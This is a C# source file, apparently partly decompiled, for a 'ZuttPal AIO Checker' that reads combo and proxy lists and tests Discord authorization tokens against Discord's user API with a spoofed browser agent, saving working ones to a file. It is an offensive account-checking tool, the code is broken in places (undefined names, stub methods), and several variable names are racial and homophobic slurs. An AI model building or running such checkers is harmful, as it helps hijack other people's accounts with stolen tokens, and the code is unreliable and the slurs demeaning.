using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Zuttpal;

namespace ZuttPal
{
    // Token: 0x02000003 RID: 3
    internal class tokencheck
    {
        public static string Path;
        public static void LoadFile()
        {
            Colorful.Console.Title = "ZuttPal AIO Checker by Hassoni#4623";
            Files16.ComboFile(Combo);
            Files16.ComboProxy();
        }
        public static void Startkker()
        {
            List<Thread> threads = new List<Thread>();
            tokencheck.LoadFile();
            tokencheck.UpdateTitle();
            tokencheck.Path = "Results\\Tokens\\" + Process.GetCurrentProcess().StartTime.ToString("dd-MM-yyyy-hh-mm");
            if (!Directory.Exists(check10.Path))
            {
                Checking.currentrun = "Checking Tokens";
                Directory.CreateDirectory(tokencheck.Path);
            }
            for (int i = 0; i < Program.config.threads; i++)
            {
                Thread item = new Thread((ThreadStart)tokencheck.Start);
                threads.Add(item);
            }
            foreach (var thread in threads)
                thread.Start();
            foreach (var thread in threads)
                thread.Join();
        }
        public static ProxyClient RandomProxies()
        {
            return Checking9.ProxyList[new Random().Next(0, Checking9.ProxyList.Count)];
        }
        public static List<string> CCombo = new List<string>();

        public static void ComboFile(ConcurrentQueue<string> Combo)
        {

            OpenFileDialog opencombo = new OpenFileDialog();
            string cname;
            do
            {
                opencombo.Title = "Select Combo";
                opencombo.DefaultExt = "txt";
                opencombo.Filter = "Text files|*.txt";
                opencombo.ShowDialog();
                cname = opencombo.FileName;
            }
            while (!File.Exists(cname) || cname == null);
            CCombo = new List<string>(File.ReadAllLines(cname));
            foreach (string coline in CCombo)
            {
                if (coline.Contains(":") || coline.Contains(";"))
                {
                    Combo.Enqueue(coline);
                }
            }
        }

        // Token: 0x0600002B RID: 43 RVA: 0x0000271C File Offset: 0x0000091C
        public static void ComboProxy()
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text files (*.txt)|*.txt";
                openFileDialog.Multiselect = false;
                openFileDialog.Title = "Select your proxies file";
                int num = (int)openFileDialog.ShowDialog();
                foreach (string proxyAddress in File.ReadAllLines(openFileDialog.FileName))
                {
                    bool flag = Checking.proxytype == 1;
                    if (flag)
                    {
                        tokencheck.ProxyList.Add(HttpProxyClient.Parse(proxyAddress));
                    }
                    else
                    {
                        bool flag2 = Checking.proxytype == 2;
                        if (flag2)
                        {
                            tokencheck.ProxyList.Add(Socks4ProxyClient.Parse(proxyAddress));
                        }
                        else
                        {
                            bool flag3 = Checking.proxytype == 3;
                            if (flag3)
                            {

                                tokencheck.ProxyList.Add(Socks5ProxyClient.Parse(proxyAddress));
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("ERROR: Proxies Type Invalid, exiting...");
                                Thread.Sleep(4000);
                                Environment.Exit(0);
                            }
                        }
                    }
                }
            }
            tokencheck.ComboLines = tokencheck.ComboList.Count<string>();
        }

        internal static void ComboFile(ConcurrentQueue<string> concurrentQueues, object combo)
        {
            throw new NotImplementedException();
        }

        // Token: 0x0600002C RID: 44 RVA: 0x00002878 File Offset: 0x00000A78

        // Token: 0x0400001D RID: 29
        // Token: 0x06000003 RID: 3 RVA: 0x00002058 File Offset: 0x00000258
        public static void Start()
        {

            Console.WriteLine();
            string[] lines = File.ReadAllLines(fileName);

            foreach (string token in lines)
            {
                if (check(token))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Working Token - " + token);

                    File.AppendAllText("working.txt", token + "\n");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Invalid Token - " + token);
                }
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Finished Checking. Your working tokens are in working.txt");

            while (true)
            {
                Console.ReadLine();
            }
        }

        private static bool check(String token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v8/users/@me");

            request.Method = "GET";
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36";
            request.Headers.Add("authorization", token);

            try
            {
                request.GetResponse();
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        public static int ComboLines;

        // Token: 0x04000003 RID: 3
        public static int CheckedLines;

        // Token: 0x04000004 RID: 4
        public static int Hits;

        // Token: 0x04000005 RID: 5
        public static int Bad;

        // Token: 0x04000006 RID: 6
        public static int retry;

        // Token: 0x04000007 RID: 7
        public static int counter;
        public static int Unssuported;
        // Token: 0x04000008 RID: 8
        public static int Errors;

        public static int proxytype;

        public static string currentrun;
        // Token: 0x04000009 RID: 9

        public static ConcurrentQueue<string> Combo = new ConcurrentQueue<string>();

        public static int threadsnig;
        // how to search in all files. search for a word like you did before
        public static int currentCpm;

        // Token: 0x0400000A RID: 10
        public static DateTime currentCpmDatetime;

        // Token: 0x0400000B RID: 11
        public static List<int> lastCpms = new List<int>();

        // Token: 0x0400000C RID: 12
        public static ConcurrentBag<string> ComboList = new ConcurrentBag<string>();

        // Token: 0x0400000D RID: 13
        public static List<ProxyClient> ProxyList = new List<ProxyClient>();

        // Token: 0x0400000E RID: 14
        public static int custom;

        public static int unknown;

        public static int expired;

        public static int username;

        public static bool printbad1;

        public static int printbad;

        public static bool userpc1;

        public static string ComboName;


        public static int userpc;

        public static bool printgood1;

        public static int printgood;

        public static bool print2fa1;

        public static int print2fa;

        public static bool printlocked1;

        public static int printlocked;

        public static string tokentype = "";

        public static string gaytype = "";

        public static string gaytype1 = "";

        public static string niggggger = "";

        public static string nigballs = "";

        public static string nigballs1 = "";

        public static int twofa;

        public static int embedecolor;

        public static int embedecolor1;

        public static int embedecolor2;
        public static string Cstyle;

        public static bool paused = false;
    }
}